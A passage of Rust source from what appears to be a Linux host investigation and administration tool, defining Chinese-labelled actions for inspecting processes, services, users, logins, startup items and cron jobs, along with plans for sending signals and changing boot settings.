            Self::IoStats => "I/O 统计",
            Self::MemoryUsage => "内存使用",
            Self::Smaps => "内存详细信息",
            Self::Environment => "环境变量",
            Self::NetworkConnections => "网络连接",
            Self::ListeningPorts => "监听端口",
            Self::NetworkStatus => "详细网络状态",
            Self::DnsSockets => "DNS 相关套接字",
            Self::ProcessTree => "父子进程树",
            Self::Children => "子进程列表",
            Self::Parent => "父进程信息",
            Self::Threads => "线程数",
            Self::CpuUsage => "CPU 使用率",
            Self::CpuAffinity => "CPU 亲和性",
            Self::ContextSwitches => "上下文切换",
            Self::OomScore => "OOM 分数",
            Self::Scheduler => "调度策略",
            Self::SyscallSnapshot => "系统调用统计",
            Self::KernelStack => "调用栈",
            Self::FileDescriptorStats => "文件描述符统计",
            Self::Signals => "信号处理",
            Self::Namespaces => "Namespace 信息",
            Self::Cgroup => "Cgroup 信息",
            Self::Container => "容器检测",
            Self::Uptime => "运行时长",
            Self::SuspiciousPath => "可疑路径检测",
            Self::HiddenProcess => "隐藏进程检测",
            Self::LdPreload => "LD_PRELOAD 检测",
            Self::DeletedExecutable => "已删除可执行文件",
            Self::SuspiciousNetwork => "可疑网络连接",
            Self::CryptoMining => "挖矿特征检测",
        }
    }

    pub const fn group(self) -> ProcessInvestigationGroup {
        match self {
            Self::CommandLine | Self::Executable | Self::WorkingDirectory => {
                ProcessInvestigationGroup::Basics
            }
            Self::Status | Self::Capabilities | Self::UidGid => ProcessInvestigationGroup::Identity,
            Self::OpenFiles
            | Self::MemoryMaps
            | Self::ResourceLimits
            | Self::IoStats
            | Self::MemoryUsage
            | Self::Smaps
            | Self::Environment => ProcessInvestigationGroup::FilesAndMemory,
            Self::NetworkConnections
            | Self::ListeningPorts
            | Self::NetworkStatus
            | Self::DnsSockets => ProcessInvestigationGroup::Network,
            Self::ProcessTree | Self::Children | Self::Parent | Self::Threads => {
                ProcessInvestigationGroup::Relationships
            }
            Self::CpuUsage
            | Self::CpuAffinity
            | Self::ContextSwitches
            | Self::OomScore
            | Self::Scheduler
            | Self::SyscallSnapshot
            | Self::KernelStack
            | Self::FileDescriptorStats => ProcessInvestigationGroup::Performance,
            Self::Signals | Self::Namespaces | Self::Cgroup | Self::Container | Self::Uptime => {
                ProcessInvestigationGroup::Runtime
            }
            Self::SuspiciousPath
            | Self::HiddenProcess
            | Self::LdPreload
            | Self::DeletedExecutable
            | Self::SuspiciousNetwork
            | Self::CryptoMining => ProcessInvestigationGroup::Security,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::CpuUsage => Duration::from_secs(10),
            _ => Duration::from_secs(20),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessInvestigationRequest {
    row_id: String,
    pid: u32,
    action: ProcessInvestigationAction,
}

impl ProcessInvestigationRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn pid(&self) -> u32 {
        self.pid
    }

    pub const fn action(&self) -> ProcessInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        process_investigation_command(self.pid, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ProcessInvestigationResult {
    pub row_id: String,
    pub pid: u32,
    pub action: ProcessInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessSignal {
    Terminate,
    Kill,
}

impl ProcessSignal {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Terminate => "终止进程（SIGTERM）",
            Self::Kill => "强制终止进程（SIGKILL）",
        }
    }

    const fn shell_name(self) -> &'static str {
        match self {
            Self::Terminate => "TERM",
            Self::Kill => "KILL",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ProcessIdentitySnapshot {
    pub pid: u32,
    pub start_time_ticks: u64,
    pub command_name: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalPlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: ProcessIdentitySnapshot,
    signal: ProcessSignal,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalRequest {
    row_id: String,
    pid: u32,
    signal: ProcessSignal,
}

impl ProcessSignalRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn pid(&self) -> u32 {
        self.pid
    }

    pub const fn signal(&self) -> ProcessSignal {
        self.signal
    }
}

impl ProcessSignalPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &ProcessIdentitySnapshot {
        &self.snapshot
    }

    pub const fn signal(&self) -> ProcessSignal {
        self.signal
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalOutcome {
    pub pid: u32,
    pub signal: ProcessSignal,
    pub verification: VerificationResult,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceInvestigationGroup {
    Basics,
    Logs,
    Dependencies,
    Resources,
    Security,
    Advanced,
}

impl ServiceInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::Basics,
        Self::Logs,
        Self::Dependencies,
        Self::Resources,
        Self::Security,
        Self::Advanced,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Logs => "日志查询",
            Self::Dependencies => "依赖分析",
            Self::Resources => "资源监控",
            Self::Security => "安全分析",
            Self::Advanced => "高级信息",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceInvestigationAction {
    Status,
    Configuration,
    Details,
    Logs,
    ErrorLogs,
    LiveLogs,
    Dependencies,
    ReverseDependencies,
    ServiceTree,
    CpuUsage,
    MemoryUsage,
    ProcessList,
    OpenFiles,
    RunUser,
    Permissions,
    SecurityCheck,
    ServiceFile,
    Timers,
    Environment,
}

impl ServiceInvestigationAction {
    pub const ALL: [Self; 19] = [
        Self::Status,
        Self::Configuration,
        Self::Details,
        Self::Logs,
        Self::ErrorLogs,
        Self::LiveLogs,
        Self::Dependencies,
        Self::ReverseDependencies,
        Self::ServiceTree,
        Self::CpuUsage,
        Self::MemoryUsage,
        Self::ProcessList,
        Self::OpenFiles,
        Self::RunUser,
        Self::Permissions,
        Self::SecurityCheck,
        Self::ServiceFile,
        Self::Timers,
        Self::Environment,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Status => "服务状态",
            Self::Configuration => "查看配置文件",
            Self::Details => "服务详细信息",
            Self::Logs => "查看服务日志",
            Self::ErrorLogs => "查看错误日志",
            Self::LiveLogs => "实时日志（8 秒）",
            Self::Dependencies => "查看依赖服务",
            Self::ReverseDependencies => "查看被依赖服务",
            Self::ServiceTree => "查看服务树",
            Self::CpuUsage => "CPU 使用率",
            Self::MemoryUsage => "内存使用",
            Self::ProcessList => "进程列表",
            Self::OpenFiles => "打开的文件",
            Self::RunUser => "查看运行用户",
            Self::Permissions => "查看权限配置",
            Self::SecurityCheck => "配置安全性检查",
            Self::ServiceFile => "查看服务文件",
            Self::Timers => "查看定时器配置",
            Self::Environment => "查看环境变量",
        }
    }

    pub const fn group(self) -> ServiceInvestigationGroup {
        match self {
            Self::Status | Self::Configuration | Self::Details => ServiceInvestigationGroup::Basics,
            Self::Logs | Self::ErrorLogs | Self::LiveLogs => ServiceInvestigationGroup::Logs,
            Self::Dependencies | Self::ReverseDependencies | Self::ServiceTree => {
                ServiceInvestigationGroup::Dependencies
            }
            Self::CpuUsage | Self::MemoryUsage | Self::ProcessList | Self::OpenFiles => {
                ServiceInvestigationGroup::Resources
            }
            Self::RunUser | Self::Permissions | Self::SecurityCheck => {
                ServiceInvestigationGroup::Security
            }
            Self::ServiceFile | Self::Timers | Self::Environment => {
                ServiceInvestigationGroup::Advanced
            }
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::LiveLogs => Duration::from_secs(15),
            _ => Duration::from_secs(20),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceInvestigationRequest {
    row_id: String,
    unit: String,
    action: ServiceInvestigationAction,
}

impl ServiceInvestigationRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn unit(&self) -> &str {
        &self.unit
    }

    pub const fn action(&self) -> ServiceInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        service_investigation_command(&self.unit, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ServiceInvestigationResult {
    pub row_id: String,
    pub unit: String,
    pub action: ServiceInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceRuntimeAction {
    Start,
    Stop,
    Restart,
    Reload,
    Enable,
    Disable,
    Mask,
}

impl ServiceRuntimeAction {
    pub const ALL: [Self; 6] = [
        Self::Start,
        Self::Stop,
        Self::Restart,
        Self::Reload,
        Self::Enable,
        Self::Disable,
    ];

    /// What can be done to a row of the startup inventory.
    ///
    /// Enabling is not among them. That tab is built from what is already set
    /// to start at boot — enabled systemd unit files, and the scripts the boot
    /// directories link to — so every row in it is enabled by construction.
    /// Offering to enable one was offering a no-op that could only come back
    /// as a refusal.
    pub const AUTOSTART: [Self; 2] = [Self::Start, Self::Disable];
    pub const TIMER: [Self; 3] = [Self::Stop, Self::Disable, Self::Mask];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Start => "启动服务",
            Self::Stop => "停止服务",
            Self::Restart => "重启服务",
            Self::Reload => "重新加载配置",
            Self::Enable => "启用开机自启",
            Self::Disable => "禁用开机自启",
            Self::Mask => "屏蔽单元",
        }
    }

    const fn command(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
            Self::Reload => "reload",
            Self::Enable => "enable",
            Self::Disable => "disable",
            Self::Mask => "mask",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ServiceStateSnapshot {
    pub unit: String,
    pub load_state: String,
    pub active_state: String,
    pub sub_state: String,
    pub unit_file_state: String,
    pub main_pid: u32,
    pub fragment_path: String,
    pub can_reload: bool,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimeRequest {
    row_id: String,
    unit: String,
    action: ServiceRuntimeAction,
}

impl ServiceRuntimeRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn unit(&self) -> &str {
        &self.unit
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimePlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: ServiceStateSnapshot,
    action: ServiceRuntimeAction,
}

impl ServiceRuntimePlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &ServiceStateSnapshot {
        &self.snapshot
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimeOutcome {
    pub unit: String,
    pub action: ServiceRuntimeAction,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

/// Which program this host arranges its boot links with.
///
/// Detected on the host rather than guessed from the distribution, because
/// what matters is which one is actually installed. A host with none of them
/// can still be read; it just cannot be changed from here.
#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum BootScriptManager {
    /// OpenRC, which keeps a directory per runlevel.
    RcUpdate,
    /// Debian and its derivatives.
    UpdateRcD,
    /// The Red Hat sysvinit tool.
    Chkconfig,
}

impl BootScriptManager {
    const fn name(self) -> &'static str {
        match self {
            Self::RcUpdate => "rc-update",
            Self::UpdateRcD => "update-rc.d",
            Self::Chkconfig => "chkconfig",
        }
    }

    fn parse(value: &str) -> Option<Self> {
        match value {
            "rc-update" => Some(Self::RcUpdate),
            "update-rc.d" => Some(Self::UpdateRcD),
            "chkconfig" => Some(Self::Chkconfig),
            _ => None,
        }
    }

    /// The command that adds this script to the boot sequence, and the one
    /// that takes it out again.
    ///
    /// The name is a validated single path segment and is passed as a quoted
    /// shell variable, never spliced into the command text.
    const fn commands(self) -> (&'static str, &'static str) {
        match self {
            Self::RcUpdate => (
                "rc-update add \"$n\" default",
                "rc-update del \"$n\" default",
            ),
            Self::UpdateRcD => ("update-rc.d \"$n\" defaults", "update-rc.d \"$n\" disable"),
            Self::Chkconfig => ("chkconfig \"$n\" on", "chkconfig \"$n\" off"),
        }
    }
}

/// What the boot directories say about one script right now.
///
/// `start_links` is the whole question: a script is in the boot sequence when
/// something links to it with a start link, and out of it when nothing does.
/// The other links are kept too, so the journal records exactly what the
/// directories held before the change.
#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct BootScriptStateSnapshot {
    pub name: String,
    pub path: String,
    pub manager: Option<BootScriptManager>,
    pub start_links: Vec<String>,
    pub other_links: Vec<String>,
    /// The script as it was read, so what is enabled is what was inspected.
    pub script_sha256: String,
}

impl BootScriptStateSnapshot {
    pub fn enabled(&self) -> bool {
        !self.start_links.is_empty()
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct BootScriptRuntimeRequest {
    row_id: String,
    name: String,
    path: String,
    action: ServiceRuntimeAction,
}

impl BootScriptRuntimeRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn name(&self) -> &str {
        &self.name
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct BootScriptRuntimePlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: BootScriptStateSnapshot,
    action: ServiceRuntimeAction,
}

impl BootScriptRuntimePlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &BootScriptStateSnapshot {
        &self.snapshot
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct BootScriptRuntimeOutcome {
    pub name: String,
    pub action: ServiceRuntimeAction,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

/// A runtime change asked of a row, once the row has said which kind it is.
///
/// The two are answered by different programs and verified by reading
/// different things, so they stay apart rather than sharing a snapshot that
/// would be half empty for whichever kind it was not describing.
#[derive(Debug, Clone, Eq, PartialEq)]
pub enum RuntimeChangeRequest {
    Service(ServiceRuntimeRequest),
    BootScript(BootScriptRuntimeRequest),
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserInvestigationGroup {
    Basics,
    Credentials,
    Permissions,
    Activity,
    Resources,
    Security,
}

impl UserInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::Basics,
        Self::Credentials,
        Self::Permissions,
        Self::Activity,
        Self::Resources,
        Self::Security,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Credentials => "账户状态",
            Self::Permissions => "权限分析",
            Self::Activity => "活动监控",
            Self::Resources => "资源使用",
            Self::Security => "安全检查",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserInvestigationAction {
    Details,
    Groups,
    HomeDirectory,
    PasswordExpiry,
    AccountStatus,
    SudoPermissions,
    GroupMembership,
    SshKeys,
    LoginHistory,
    CurrentSessions,
    FailedLogins,
    LastLogin,
    Processes,
    DiskUsage,
    OpenFiles,
    AbnormalLogin,
    Crontab,
    SshConfig,
    SuspiciousFiles,
    SuidFiles,
}

impl UserInvestigationAction {
    pub const ALL: [Self; 20] = [
        Self::Details,
        Self::Groups,
        Self::HomeDirectory,
        Self::PasswordExpiry,
        Self::AccountStatus,
        Self::SudoPermissions,
        Self::GroupMembership,
        Self::SshKeys,
        Self::LoginHistory,
        Self::CurrentSessions,
        Self::FailedLogins,
        Self::LastLogin,
        Self::Processes,
        Self::DiskUsage,
        Self::OpenFiles,
        Self::AbnormalLogin,
        Self::Crontab,
        Self::SshConfig,
        Self::SuspiciousFiles,
        Self::SuidFiles,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "用户详情",
            Self::Groups => "用户组信息",
            Self::HomeDirectory => "主目录信息",
            Self::PasswordExpiry => "密码过期时间",
            Self::AccountStatus => "账户状态",
            Self::SudoPermissions => "Sudo 权限",
            Self::GroupMembership => "用户组成员",
            Self::SshKeys => "SSH 密钥",
            Self::LoginHistory => "登录历史",
            Self::CurrentSessions => "当前会话",
            Self::FailedLogins => "失败登录",
            Self::LastLogin => "最后登录",
            Self::Processes => "用户进程",
            Self::DiskUsage => "磁盘使用",
            Self::OpenFiles => "打开文件",
            Self::AbnormalLogin => "异常登录检查",
            Self::Crontab => "定时任务",
            Self::SshConfig => "SSH 配置",
            Self::SuspiciousFiles => "可疑文件",
            Self::SuidFiles => "SUID / SGID 文件",
        }
    }

    pub const fn group(self) -> UserInvestigationGroup {
        match self {
            Self::Details | Self::Groups | Self::HomeDirectory => UserInvestigationGroup::Basics,
            Self::PasswordExpiry | Self::AccountStatus => UserInvestigationGroup::Credentials,
            Self::SudoPermissions | Self::GroupMembership | Self::SshKeys => {
                UserInvestigationGroup::Permissions
            }
            Self::LoginHistory | Self::CurrentSessions | Self::FailedLogins | Self::LastLogin => {
                UserInvestigationGroup::Activity
            }
            Self::Processes | Self::DiskUsage | Self::OpenFiles => {
                UserInvestigationGroup::Resources
            }
            Self::AbnormalLogin
            | Self::Crontab
            | Self::SshConfig
            | Self::SuspiciousFiles
            | Self::SuidFiles => UserInvestigationGroup::Security,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::DiskUsage | Self::SuspiciousFiles | Self::SuidFiles => Duration::from_secs(30),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserIdentity {
    pub row_id: String,
    pub username: String,
    pub uid: u32,
    pub gid: u32,
    pub home: String,
    pub shell: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserInvestigationRequest {
    identity: UserIdentity,
    action: UserInvestigationAction,
}

impl UserInvestigationRequest {
    pub fn identity(&self) -> &UserIdentity {
        &self.identity
    }

    pub const fn action(&self) -> UserInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        user_investigation_command(&self.identity.username, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserInvestigationResult {
    pub row_id: String,
    pub username: String,
    pub action: UserInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum LoginInvestigationGroup {
    User,
    Source,
    Logs,
}

impl LoginInvestigationGroup {
    pub const ALL: [Self; 3] = [Self::User, Self::Source, Self::Logs];

    pub const fn label(self) -> &'static str {
        match self {
            Self::User => "用户分析",
            Self::Source => "来源分析",
            Self::Logs => "日志审计",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum LoginInvestigationAction {
    UserDetails,
    UserLoginCount,
    UserFailedCount,
    UserSudoHistory,
    SourceLogins,
    Whois,
    ReverseDns,
    AuthLogs,
    RecentFailures,
    BruteForceCheck,
}

impl LoginInvestigationAction {
    pub const ALL: [Self; 10] = [
        Self::UserDetails,
        Self::UserLoginCount,
        Self::UserFailedCount,
        Self::UserSudoHistory,
        Self::SourceLogins,
        Self::Whois,
        Self::ReverseDns,
        Self::AuthLogs,
        Self::RecentFailures,
        Self::BruteForceCheck,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::UserDetails => "用户详情",
            Self::UserLoginCount => "用户登录统计",
            Self::UserFailedCount => "用户失败登录",
            Self::UserSudoHistory => "用户 Sudo 记录",
            Self::SourceLogins => "来源 IP 登录记录",
            Self::Whois => "WHOIS 查询",
            Self::ReverseDns => "反向 DNS 查询",
            Self::AuthLogs => "认证日志",
            Self::RecentFailures => "最近失败登录",
            Self::BruteForceCheck => "暴力破解检测",
        }
    }

    pub const fn group(self) -> LoginInvestigationGroup {
        match self {
            Self::UserDetails
            | Self::UserLoginCount
            | Self::UserFailedCount
            | Self::UserSudoHistory => LoginInvestigationGroup::User,
            Self::SourceLogins | Self::Whois | Self::ReverseDns => LoginInvestigationGroup::Source,
            Self::AuthLogs | Self::RecentFailures | Self::BruteForceCheck => {
                LoginInvestigationGroup::Logs
            }
        }
    }

    const fn requires_source(self) -> bool {
        matches!(self, Self::SourceLogins | Self::Whois | Self::ReverseDns)
    }

    const fn requires_current_user(self) -> bool {
        matches!(
            self,
            Self::UserDetails
                | Self::UserLoginCount
                | Self::UserFailedCount
                | Self::UserSudoHistory
                | Self::AuthLogs
        )
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Whois => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct LoginIdentity {
    pub row_id: String,
    pub username: String,
    pub terminal: String,
    pub source: Option<IpAddr>,
    pub login_time: String,
    pub status: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct LoginInvestigationRequest {
    identity: LoginIdentity,
    action: LoginInvestigationAction,
}

impl LoginInvestigationRequest {
    pub fn identity(&self) -> &LoginIdentity {
        &self.identity
    }

    pub const fn action(&self) -> LoginInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        login_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct LoginInvestigationResult {
    pub row_id: String,
    pub username: String,
    pub source: Option<IpAddr>,
    pub action: LoginInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PackageInvestigationAction {
    Details,
    Files,
    Dependencies,
    Changelog,
    Integrity,
    ConfigFiles,
    RelatedServices,
    RemovalPreview,
}

impl PackageInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Details,
        Self::Files,
        Self::Dependencies,
        Self::Changelog,
        Self::Integrity,
        Self::ConfigFiles,
        Self::RelatedServices,
        Self::RemovalPreview,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "包详细信息",
            Self::Files => "列出包文件",
            Self::Dependencies => "查看依赖关系",
            Self::Changelog => "本地变更日志",
            Self::Integrity => "验证完整性",
            Self::ConfigFiles => "检查配置文件修改",
            Self::RelatedServices => "相关服务",
            Self::RemovalPreview => "卸载影响预览",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum KernelModuleInvestigationAction {
    Info,
    Dependencies,
    Parameters,
    Path,
    Signing,
    Taint,
    Hash,
    Dmesg,
}

impl KernelModuleInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Info,
        Self::Dependencies,
        Self::Parameters,
        Self::Path,
        Self::Signing,
        Self::Taint,
        Self::Hash,
        Self::Dmesg,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Info => "模块详情",
            Self::Dependencies => "依赖关系",
            Self::Parameters => "运行参数",
            Self::Path => "模块文件路径",
            Self::Signing => "签名信息",
            Self::Taint => "内核污染标志",
            Self::Hash => "模块文件哈希",
            Self::Dmesg => "相关 dmesg 日志",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum EnvVarInvestigationAction {
    TraceSource,
    LdPreload,
    PathDirectories,
    ProcessOwners,
}

impl EnvVarInvestigationAction {
    pub const ALL: [Self; 4] = [
        Self::TraceSource,
        Self::LdPreload,
        Self::PathDirectories,
        Self::ProcessOwners,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::TraceSource => "追踪变量来源",
            Self::LdPreload => "检查动态链接劫持",
            Self::PathDirectories => "检查 PATH 目录权限",
            Self::ProcessOwners => "进程中的同名变量",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum StartupInvestigationAction {
    Details,
    Command,
    UnitFile,
    StartupType,
    ConfigLocation,
    ViewConfig,
    SuspiciousPath,
    FileSignature,
    ModificationTime,
    MalwareIndicators,
    Dependencies,
    BootOrder,
    BootTime,
    ResourceUsage,
    StartupLogs,
    ErrorLogs,
    RunHistory,
    ConfigSummary,
}

impl StartupInvestigationAction {
    pub const ALL: [Self; 18] = [
        Self::Details,
        Self::Command,
        Self::UnitFile,
        Self::StartupType,
        Self::ConfigLocation,
        Self::ViewConfig,
        Self::SuspiciousPath,
        Self::FileSignature,
        Self::ModificationTime,
        Self::MalwareIndicators,
        Self::Dependencies,
        Self::BootOrder,
        Self::BootTime,
        Self::ResourceUsage,
        Self::StartupLogs,
        Self::ErrorLogs,
        Self::RunHistory,
        Self::ConfigSummary,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "启动项详情",
            Self::Command => "启动命令",
            // Not "单元文件": on a host that boots with sysvinit or OpenRC the
            // same row is a script, and there is no unit anywhere in sight.
            Self::UnitFile => "启动文件内容",
            Self::StartupType => "启用方式与目标",
            Self::ConfigLocation => "配置文件位置",
            Self::ViewConfig => "完整有效配置",
            Self::SuspiciousPath => "可疑路径检查",
            Self::FileSignature => "文件哈希",
            Self::ModificationTime => "配置修改时间",
            Self::MalwareIndicators => "恶意特征检查",
            Self::Dependencies => "依赖关系",
            Self::BootOrder => "启动顺序",
            Self::BootTime => "启动耗时",
            Self::ResourceUsage => "资源使用",
            Self::StartupLogs => "启动日志",
            Self::ErrorLogs => "错误日志",
            Self::RunHistory => "运行历史",
            Self::ConfigSummary => "配置汇总",
        }
    }

    /// Whether this question can be asked of a boot script rather than a
    /// systemd unit.
    ///
    /// Two of them cannot, and saying so here rather than at the command is
    /// what keeps them out of the menu: an action that is offered and then
    /// refuses is worse than one that was never offered. Boot timing comes
    /// from `systemd-analyze`, and the resource figures come from the
    /// accounting systemd keeps per unit; a script has neither, and inventing
    /// a nearby answer would be worse than having none.
    pub const fn applies_to_script(self) -> bool {
        !matches!(self, Self::BootTime | Self::ResourceUsage)
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum CronInvestigationAction {
    ViewSource,
    Details,
    Schedule,
    Command,
    ViewCrontab,
    ExecutionLogs,
    RecentRuns,
    ErrorLogs,
    ParseSchedule,
    NextRun,
    Frequency,
    SecurityCheck,
    PathCheck,
    SuspiciousCheck,
    ExportRecord,
}

impl CronInvestigationAction {
    pub const ALL: [Self; 15] = [
        Self::ViewSource,
        Self::Details,
        Self::Schedule,
        Self::Command,
        Self::ViewCrontab,
        Self::ExecutionLogs,
        Self::RecentRuns,
        Self::ErrorLogs,
        Self::ParseSchedule,
        Self::NextRun,
        Self::Frequency,
        Self::SecurityCheck,
        Self::PathCheck,
        Self::SuspiciousCheck,
        Self::ExportRecord,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewSource => "查看来源文件",
            Self::Details => "任务详情",
            Self::Schedule => "时间表达式",
            Self::Command => "任务命令（只读）",
            Self::ViewCrontab => "定位原始条目",
            Self::ExecutionLogs => "执行日志",
            Self::RecentRuns => "近期运行",
            Self::ErrorLogs => "错误日志",
            Self::ParseSchedule => "解析时间表达式",
            Self::NextRun => "下次匹配预览",
            Self::Frequency => "频率说明",
            Self::SecurityCheck => "命令安全检查",
            Self::PathCheck => "可执行路径检查",
            Self::SuspiciousCheck => "可疑特征检查",
            Self::ExportRecord => "导出当前记录",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum TimerInvestigationAction {
    TimerStatus,
    TimerConfig,
    UnitStatus,
    UnitConfig,
    TimerLogs,
    UnitLogs,
}

impl TimerInvestigationAction {
    pub const ALL: [Self; 6] = [
        Self::TimerStatus,
        Self::TimerConfig,
        Self::UnitStatus,
        Self::UnitConfig,
        Self::TimerLogs,
        Self::UnitLogs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::TimerStatus => "定时器状态",
            Self::TimerConfig => "定时器配置",
            Self::UnitStatus => "触发单元状态",
            Self::UnitConfig => "触发单元配置",
            Self::TimerLogs => "定时器日志",
            Self::UnitLogs => "触发单元日志",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ShellConfigInvestigationAction {
    ViewContext,
    ViewFile,
    Permissions,
    History,
    SuspiciousLines,
